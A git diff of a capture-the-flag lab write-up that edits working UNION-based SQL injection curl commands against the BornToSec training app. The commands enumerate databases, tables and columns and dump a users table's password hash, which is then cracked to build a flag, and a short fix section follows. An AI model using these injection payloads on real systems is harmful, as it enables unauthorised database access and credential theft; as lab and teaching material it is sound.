@@ -17,7 +17,7 @@ We decided to present two different methods: one using the input box on the webp
 ```
 
 ```
-curl -s 'http://localhost:9090/?page=member&id=0+UNION+SELECT+1%2Cschema_name+FROM+information_schema.schemata%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.*<br\/>//' | sed 's/<\/pre>//' | grep -v table | awk '{print $3}'
+curl -s 'http://BornToSec.com/?page=member&id=0+UNION+SELECT+1%2Cschema_name+FROM+information_schema.schemata%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.*<br\/>//' | sed 's/<\/pre>//' | grep -v table | awk '{print $3}'
 ```
 
 ---
@@ -29,7 +29,7 @@ curl -s 'http://localhost:9090/?page=member&id=0+UNION+SELECT+1%2Cschema_name+FR
 ```
 
 ```
-curl -s 'http://localhost:9090/?page=member&id=0+UNION+SELECT+table_schema%2Ctable_name+FROM+information_schema.tables%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.* <br\/>//' | sed 's/<br\/>/\n/' | sed 's/<\/pre>//' | sed 's/First name: /\n[+] Database   : /' | sed 's/Surname : /[-] Table name : /' | grep -v table
+curl -s 'http://BornToSec.com/?page=member&id=0+UNION+SELECT+table_schema%2Ctable_name+FROM+information_schema.tables%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.* <br\/>//' | sed 's/<br\/>/\n/' | sed 's/<\/pre>//' | sed 's/First name: /\n[+] Database   : /' | sed 's/Surname : /[-] Table name : /' | grep -v table
 ```
 
 ---
@@ -48,7 +48,7 @@ echo -n 'users' | xxd -p
 ```
 
 ```
-curl -s 'http://localhost:9090/?page=member&id=0+UNION+SELECT+1%2Ccolumn_name+FROM+information_schema.columns+WHERE+table_name%3D0x7573657273%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.* <br\/>//' | sed 's/<br\/>/\n/' | sed 's/<\/pre>//' | sed 's/Surname : //' | grep -v 'First name' | grep -v table
+curl -s 'http://BornToSec.com/?page=member&id=0+UNION+SELECT+1%2Ccolumn_name+FROM+information_schema.columns+WHERE+table_name%3D0x7573657273%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.* <br\/>//' | sed 's/<br\/>/\n/' | sed 's/<\/pre>//' | sed 's/Surname : //' | grep -v 'First name' | grep -v table
 ```
 
 ---
@@ -60,14 +60,14 @@ curl -s 'http://localhost:9090/?page=member&id=0+UNION+SELECT+1%2Ccolumn_name+FR
 ```
 
 ```
-curl -s 'http://localhost:9090/?page=member&id=0+UNION+SELECT+Commentaire%2Ccountersign+FROM+Member_Sql_Injection.users%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.* <br\/>//' | sed 's/<br\/>/\n/' | sed 's/<\/pre>//' | sed 's/First name: /\n[+] Commentaire : /' | sed 's/Surname : /[-] Countersign : /' | grep -v table
+curl -s 'http://BornToSec.com/?page=member&id=0+UNION+SELECT+Commentaire%2Ccountersign+FROM+Member_Sql_Injection.users%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.* <br\/>//' | sed 's/<br\/>/\n/' | sed 's/<\/pre>//' | sed 's/First name: /\n[+] Commentaire : /' | sed 's/Surname : /[-] Countersign : /' | grep -v table
 ```
 
 ---
 
 **5. Crack the hash and craft the flag using the steps provided**
 
-To craft the flag, we must follow the instructions found on the last step: _```Decrypt this password -> then lower all the char. Sh256 on it and it's good !```_
+To craft the flag, we must follow the instructions found on the previous step: _```Decrypt this password -> then lower all the char. Sh256 on it and it's good !```_
 
 ![](./CrackStation.png)
 
@@ -79,13 +79,13 @@ echo -n 'fortytwo' | sha256sum
 We used ```https://crackstation.net/``` to crack the hash. This page doesn't really _crack_ the hash you provide, but performs a lookup on pre-computed hashes instead.
 
 ## 🔧 Fix
-To protect against SQLi, it is crutial to always sanitize the users' input before querying the database. It is also possible to use an ORM or library to query the database and avoid manual sanitization.
+To protect against SQLi, it is crutial to always sanitize the users' input before querying the database. It is also possible to use an ORM or library to query the database securely and avoid manual sanitization.
 
 ## ☝️🤓 Advanced explanation
 In this case, we could get the data from the database on the response page. However, there are many other scenarios that require other techniques to dump the data.
 
 - https://www.acunetix.com/websitesecurity/sql-injection2/
 
-Apart from the channel used to retrieve the data, there are other techniques that can be used to bypass filtering and perform SQLi. We used this as quotes were not working in our injection scenario.
+There are many techniques that can be used to bypass filtering and perform SQLi. We faced this issue, as quotes were not working in our injection scenario.
 
 - https://portswigger.net/support/sql-injection-bypassing-common-filters
